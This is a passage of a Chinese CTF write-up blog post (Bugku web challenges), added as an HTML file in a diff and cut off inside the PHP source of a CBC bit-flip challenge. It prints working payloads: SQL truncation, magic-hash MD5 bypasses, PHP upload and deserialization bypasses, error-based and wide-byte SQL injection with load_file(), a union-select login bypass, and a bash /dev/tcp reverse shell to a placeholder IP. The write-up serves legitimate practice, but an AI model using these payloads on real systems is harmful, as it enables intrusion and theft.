@@ -1,0 +1,1518 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8">
+<title>Bugku writeup4 - Junay的博客</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+
+
+    <meta name="description" content="weblogin1(SKCTF)&amp;emsp;&amp;emsp;题目描述：     &amp;emsp;&amp;emsp;这道题用的是sql约束攻击，利用的是数据库字段定义时产生的漏洞。如：1234mysql&amp;gt; CREATE TABLE users (    -&amp;gt;   username varchar(25),    -&amp;gt;   password varchar(25)    -&amp;gt; );&amp;ems">
+<meta name="keywords" content="hexo,javascript">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bugku writeup4">
+<meta property="og:url" content="http://yoursite.com/2018/03/bugku-writeup4/index.html">
+<meta property="og:site_name" content="Junay的博客">
+<meta property="og:description" content="weblogin1(SKCTF)&amp;emsp;&amp;emsp;题目描述：     &amp;emsp;&amp;emsp;这道题用的是sql约束攻击，利用的是数据库字段定义时产生的漏洞。如：1234mysql&amp;gt; CREATE TABLE users (    -&amp;gt;   username varchar(25),    -&amp;gt;   password varchar(25)    -&amp;gt; );&amp;ems">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/67.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/68.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/69.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/70.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/71.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/72.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/73.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/74.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/75.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/76.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/77.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/78.PNG">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/79.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/80.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/82.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/81.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/83.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/84.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/85.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/86.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/87.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/88.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/89.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/90.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/91.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/92.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/93.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/94.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/95.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/96.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/97.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/98.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/99.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/100.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/101.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/102.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/103.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/104.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/105.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/106.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/107.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/108.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/109.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/110.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/111.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/112.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/bugku/113.png">
+<meta property="og:updated_time" content="2018-11-23T12:42:02.724Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Bugku writeup4">
+<meta name="twitter:description" content="weblogin1(SKCTF)&amp;emsp;&amp;emsp;题目描述：     &amp;emsp;&amp;emsp;这道题用的是sql约束攻击，利用的是数据库字段定义时产生的漏洞。如：1234mysql&amp;gt; CREATE TABLE users (    -&amp;gt;   username varchar(25),    -&amp;gt;   password varchar(25)    -&amp;gt; );&amp;ems">
+<meta name="twitter:image" content="http://yoursite.com/images/posts/bugku/67.png">
+
+
+
+
+
+<link rel="icon" href="/images/favicon.png">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+    
+    <style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+    
+
+    
+    
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+    
+
+    
+    
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+
+    
+    
+    
+    
+
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+<link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/logo.svg" alt="Bugku writeup4" height="28">
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">Home</a>
+                
+                <a class="navbar-item"
+                href="/archives">Archives</a>
+                
+                <a class="navbar-item"
+                href="/categories">Categories</a>
+                
+                <a class="navbar-item"
+                href="/tags">Tags</a>
+                
+                <a class="navbar-item"
+                href="/about">About</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                    
+                    
+                    <a class="navbar-item" target="_blank" title="Download on GitHub" href="https://github.com/delcoding">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                    
+                
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main"><div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-03-20T16:40:00.000Z">2018-03-21</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    20 分钟 读完 (大约 3021 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                Bugku writeup4
+            
+        </h1>
+        <div class="content">
+            <a id="more"></a>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="login1-SKCTF"><a href="#login1-SKCTF" class="headerlink" title="login1(SKCTF)"></a>login1(SKCTF)</h3><p>&emsp;&emsp;题目描述：</p>
+<div align="center"><br>    <img src="/images/posts/bugku/67.png"><br></div><br>&emsp;&emsp;这道题用的是<code>sql约束攻击</code>，利用的是数据库字段定义时产生的漏洞。如：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">mysql&gt;</span><span class="hljs-bash"> CREATE TABLE users (</span></span><br><span class="line">    -&gt;   username varchar(25),</span><br><span class="line">    -&gt;   password varchar(25)</span><br><span class="line">    -&gt; );</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;这里的<code>username</code>只允许25个字符，超过后就舍去25字符以后的，然后在<code>mysql</code>中，<code>admin</code>跟<code>admin       [很多空格]</code>在查询的时候是一样的。因为<code>admin</code>用户已经存在，但我们不知道他的密码，所以我们自己注册一个<code>admin</code>然后替换掉密码。所以我们可以注册一个<code>admin[很多个空格]1</code>的用户名，只要总字符数超过25，然后密码设成你的。注册成功后使用<code>admin</code>加你的<code>密码</code>去登陆即可得到flag。<br><br>### md5 collision(NUPT_CTF)<br>&emsp;&emsp;这道题是MD5碰撞，PHP在进行比较运算时，如果遇到了0e\d+这种字符串，就会将这种字符串解析为科学计数法，然后<code>0 == 字符串</code>是成立的，从而绕过了MD5检查，这里记录一些MD5值：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure><br><br>### 文件包含2<br>&emsp;&emsp;打开题目，在源代码中发现了<code>upload.php</code><br><div align="center"><br>    <img src="/images/posts/bugku/68.png"><br></div><br>&emsp;&emsp;访问后发现是文件上传，但是只支持图片文件，不够这里没关系，不用考虑怎么绕过，因为文件包含的时候会使用<code>php</code>解析：<br><div align="center"><br>    <img src="/images/posts/bugku/69.png"><br></div><br>&emsp;&emsp;上传一句话<br><div align="center"><br>    <img src="/images/posts/bugku/70.png"><br></div><br><div align="center"><br>    <img src="/images/posts/bugku/71.png"><br></div><br>&emsp;&emsp;但是访问后发现存在过滤，<code>&lt;?php</code>被替换成<code>_</code>。如下图：<br><div align="center"><br>    <img src="/images/posts/bugku/72.png"><br></div><br>&emsp;&emsp;但是我们可以使用<code>&lt;script language=php&gt; &lt;/script&gt;</code>标签绕过这个验证，我们再上传一次：<br><div align="center"><br>    <img src="/images/posts/bugku/73.png"><br></div><br><div align="center"><br>    <img src="/images/posts/bugku/74.png"><br></div><br>&emsp;&emsp;可以看到，后台已经成功的解析了我们的<code>php代码</code>。接着使用菜刀连接。<br><div align="center"><br>    <img src="/images/posts/bugku/75.png"><br></div><br><div align="center"><br>    <img src="/images/posts/bugku/76.png"><br></div><br>&emsp;&emsp;最终我们能拿到flag：<code>SKCTF{uP104D_1nclud3_426fh8_is_Fun}</code>。<br><br>### flag.php<br>&emsp;&emsp;题目：<br><div align="center"><br>    <img src="/images/posts/bugku/77.png"><br></div><br>&emsp;&emsp;打开页面后发现提交表单没有反应，然后想起题目提示，所以尝试一下<code>get</code>一个请求。然后可以找到源码：<br><div align="center"><br>    <img src="/images/posts/bugku/78.PNG"><br></div><br><div align="center"><br>    <img src="/images/posts/bugku/79.png"><br></div><br>&emsp;&emsp;这里有些诱惑性的东西，它故意在最后放出了<code>$key</code>的值，然而当你拿着<code>$KEY=&#39;ISecer:www.isecer.com&#39;;</code>去序列化后提交会发现是不对的。<br><div align="center"><br>    <img src="/images/posts/bugku/80.png"><br></div><br>&emsp;&emsp;其实这道题用得知识跟数字与字符串比较的绕过方式有点相似，首先<code>$KEY</code>的值是没有定义的，但是我们可以构造<code>s:0:&quot;&quot;;</code>字符串，他反序列化的结果就是一个空的字符串，然后绕过他的比较。<br><div align="center"><br>    <img src="/images/posts/bugku/82.png" height="50%"><br></div><br><div align="center"><br>    <img src="/images/posts/bugku/81.png"><br></div><br>&emsp;&emsp;此时flag就出来了。<br><br>### sql注入2<br>&emsp;&emsp;题目描述：<br><div align="center"><br>    <img src="/images/posts/bugku/83.png"><br></div><br><div align="center"><br>    <img src="/images/posts/bugku/84.png"><br></div><br>&emsp;&emsp;这道题尝试了很多注入但都没有成功，后来经过看网上的writeup，才发现是<code>.DS_Store</code>泄露，然后网上找了个<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">exp</a>，运行后就能得到flag文件。<br><div align="center"><br>    <img src="/images/posts/bugku/85.png"><br></div><br><div align="center"><br>    <img src="/images/posts/bugku/86.png"><br></div><br>&emsp;&emsp;flag就是：<code>flag{sql_iNJEct_comMon3600!}</code>。<br><br>### 孙xx的博客<br>&emsp;&emsp;题目描述：<br><div align="center"><br>    <img src="/images/posts/bugku/87.png"><br></div><br>&emsp;&emsp;这里提示信息搜集，所以我们扫一扫目录：<br><div align="center"><br>    <img src="/images/posts/bugku/88.png"><br></div><br>&emsp;&emsp;这里扫出了<code>phpmyadmin</code>的目录，然后再去网站上看看，然后就能发现数据库的用户名和密码。<br><div align="center"><br>    <img src="/images/posts/bugku/89.png"><br></div><br>&emsp;&emsp;我们拿去登陆一下，就能发现flag。<br><div align="center"><br>    <img src="/images/posts/bugku/90.png"><br></div>
+
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>&emsp;&emsp;题目描述：</p>
+<div align="center"><br>    <img src="/images/posts/bugku/91.png"><br></div><br>&emsp;&emsp;可以看到这里过滤了很多字符，包括<code>空格</code>，但由于<code>mysql</code>的特性，我们可以使用回车换行符还替代即<code>%0a</code>或<code>%0d</code>。<br><br>&emsp;&emsp;因为要进行报错注入，所以我们可以使用<code>extractvalue()</code>或者<code>updatexml()</code>进行报错，尝试一条报错语句：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1%0aand%0aextractvalue(1,concat(0x7e,(select%0a@@version),0x7e))</span><br><span class="line">?id=1%0aand%0aupdatexml(1,concat(0x7e,(select%0a@@version),0x7e),1)</span><br></pre></td></tr></table></figure><br><br><div align="center"><br>    <img src="/images/posts/bugku/92.png"><br></div><br>&emsp;&emsp;可以看到已经成功报错，这里把<code>%0a</code>换成<code>%0d</code>也是可以的。要读取文件，mysql提供了<code>load_file()</code>函数，并且需要对文件名进行<code>16进制</code>编码。又因为<code>extractvalue()</code>有长度限制,最长为<code>32位</code>，所以我们需要使用<code>substr()</code>对<code>hex()</code>过的文件内容进行分割，我们一次取30个就好。这里注意的是如果不对文件内容进行<code>16进制</code>编码就会出现无法读取的情况。<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%0aand%0a(extractvalue(1,concat(0x7e,substr(hex(load_file(0x2f7661722f746573742f6b65795f312e706870)),1,30))),0x7e)</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;最终我们能拿到一串16进制的字符，然后解密就可以得到flag：<br><div align="center"><br>    <img src="/images/posts/bugku/93.png"><br></div><br>&emsp;&emsp;但这里最坑的就是双引号是中文的<code>”</code>，所以直接复制题目给的flag形式，然后把双引号里的值粘贴进去就行了。<br><br>### login3(SKCTF)<br>&emsp;&emsp;打开题目，发现过滤了很多字符，包括<code>空格 , = and</code>，所以这给我们注入带来极大的不便，但是<code>or select &gt;</code>没有被过滤，我们先找到闭合字符。而且我们注意到，页面使用的是<code>en</code>编码，所以可以考虑<code>宽字节</code>注入。<br><div align="center"><br>    <img src="/images/posts/bugku/94.png"><br></div><br>&emsp;&emsp;然后我们构造了验证poc：<code>username=admin%df%27or&#39;1&#39;&gt;&#39;1&amp;password=admin</code>跟<code>username=admin%df%27or&#39;2&#39;&gt;&#39;1&amp;password=admin</code>。<br><div align="center"><br>    <img src="/images/posts/bugku/95.png"><br></div><br><div align="center"><br>    <img src="/images/posts/bugku/96.png"><br></div><br>&emsp;&emsp;可以看到当<code>or</code>返回真时它会检查<code>password</code>是否正确，而当<code>or</code>返回假时会报<code>没有此用户</code>的错误，所以，我们可以接着构造我们的payload。下面是我的payload：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin%df%27or(select(password))&gt;&apos;0&amp;password=admin</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;我们只需要不断刷新<code>&gt;&#39;</code>后面的字符就能把密码给注入出来，这里值得注意的是最后一个值的确定，可以看到当最后一个字符为<code>/</code>时页面返回了真，而为<code>0</code>时则返回了假。<br><div align="center"><br>    <img src="/images/posts/bugku/97.png"><br></div><br><div align="center"><br>    <img src="/images/posts/bugku/98.png"><br></div><br>&emsp;&emsp;因为我们使用的是<code>&gt;</code>来进行判断的，所以最后的一个值一定会比真实值<code>小</code>，也就是说我们最后一位应该取<code>0</code>才是正确的。所以最终md5值：<code>51b7a76d51e70b419f60d3473fb6f900</code>。解密出来就是：<code>skctf123456</code>。然后我们登陆一下就能获得flag。<br><div align="center"><br>    <img src="/images/posts/bugku/99.png"><br></div><br>&emsp;&emsp;ps：本来这里是打算写脚本跑的，但因为判断条件在脚本里无法使用，在postman中也不能作为判别的依据，所以，这个方法只能在<code>burpsuite</code>跟<code>zap</code>上使用。<br><div align="center"><br>    <img src="/images/posts/bugku/100.png" height="50%"><br></div>
+
+<h3 id="Trim的日记本"><a href="#Trim的日记本" class="headerlink" title="Trim的日记本"></a>Trim的日记本</h3><p>&emsp;&emsp;打开页面后如下：</p>
+<p><div align="center"><br>    <img src="/images/posts/bugku/101.png" height="80%"><br></div><br>&emsp;&emsp;然后随手注册了以一个账号，但发现不知道<code>id</code>无法登陆，所以就拿出了目录扫描器看看有什么发现。</p>
+<p><div align="center"><br>    <img src="/images/posts/bugku/102.png"><br></div><br>&emsp;&emsp;然后这里还真的有发现，我们访问一下<code>show.php</code>。</p>
+<p><div align="center"><br>    <img src="/images/posts/bugku/103.png"><br></div><br>&emsp;&emsp;可以发现一个flag，拿去提交还真是真的flag。所以这道题就so easy了。。。</p>
+<h3 id="login2-SKCTF"><a href="#login2-SKCTF" class="headerlink" title="login2(SKCTF)"></a>login2(SKCTF)</h3><p>&emsp;&emsp;这道题就是学习姿势了，自己做的时候没有找到思路，然后看了writeup才做出来。</p>
+<p>&emsp;&emsp;对请求抓包，然后可以发现<code>tip</code>，解密出来是几行代码。</p>
+<p><div align="center"><br>    <img src="/images/posts/bugku/104.png"><br></div><br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="hljs-string">"SELECT username,password FROM admin WHERE username='"</span>.$username.<span class="hljs-string">"'"</span>;</span><br><span class="line"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($row) &amp;&amp; $row[<span class="hljs-string">'password'</span>]===md5($password))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;这里可以看到它是分离式的验证，首先查询<code>username</code>的用户，然后拿出<code>password</code>再进行比较，一开始想着是注入出<code>admin</code>的密码，但发现可能没有这个用户，而且也找不到注入的<code>poc</code>。后来参考网上的writeup才知道正确的打开方式。payload：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&apos; union select md5(1),md5(1)#&amp;password=1</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;执行这条语句时由于前面的<code>username</code>为空，所以没有数据返回，但后面的<code>union select md5(1),md5(1)</code>则会返回两个MD5(1)的值，然后<code>password</code>我们也置为<code>1</code>，从而绕过<code>if</code>语句的判断。</p>
+<p>&emsp;&emsp;接下来可以进入命令执行的页面。</p>
+<p><div align="center"><br>    <img src="/images/posts/bugku/105.png"><br></div><br>&emsp;&emsp;然后我们反弹回一个shell来方便我们操作。我们先在本地监听一下，这里使用nc。<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvv 8888</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;然后执行反弹shell的命令。<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|bash -i &gt;&amp; /dev/tcp/你的公网ip/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;最后就能在服务器上收到shell，然后查询flag。</p>
+<p><div align="center"><br>    <img src="/images/posts/bugku/106.png" height="70%"><br></div><br>&emsp;&emsp;所以flag：<code>SKCTF{Uni0n_@nd_c0mM4nD_exEc}</code>。</p>
+<h3 id="login4（CBC字节翻转攻击）"><a href="#login4（CBC字节翻转攻击）" class="headerlink" title="login4（CBC字节翻转攻击）"></a>login4（CBC字节翻转攻击）</h3><p>&emsp;&emsp;这道题就纯属学习姿势了，首先是进行敏感目录扫描，然后发现<code>.index.php.swp</code>源码泄露。</p>
+<p><div align="center"><br>    <img src="/images/posts/bugku/107.png"><br></div><br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">define(<span class="hljs-string">"SECRET_KEY"</span>, file_get_contents(<span class="hljs-string">'/root/key'</span>));</span><br><span class="line">define(<span class="hljs-string">"METHOD"</span>, <span class="hljs-string">"aes-128-cbc"</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_random_iv</span><span class="hljs-params">()</span></span>&#123;</span><br><span class="line">    $random_iv=<span class="hljs-string">''</span>;</span><br><span class="line">    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;<span class="hljs-number">16</span>;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(<span class="hljs-number">1</span>,<span class="hljs-number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span><span class="hljs-params">($info)</span></span>&#123;</span><br><span class="line">    $iv = get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[<span class="hljs-string">'username'</span>] = $info[<span class="hljs-string">'username'</span>];</span><br><span class="line">    setcookie(<span class="hljs-string">"iv"</span>, base64_encode($iv));</span><br><span class="line">    setcookie(<span class="hljs-string">"cipher"</span>, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_login</span><span class="hljs-params">()</span></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_COOKIE[<span class="hljs-string">'cipher'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>($_COOKIE[<span class="hljs-string">'iv'</span>]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[<span class="hljs-string">'cipher'</span>]);</span><br><span class="line">        $iv = 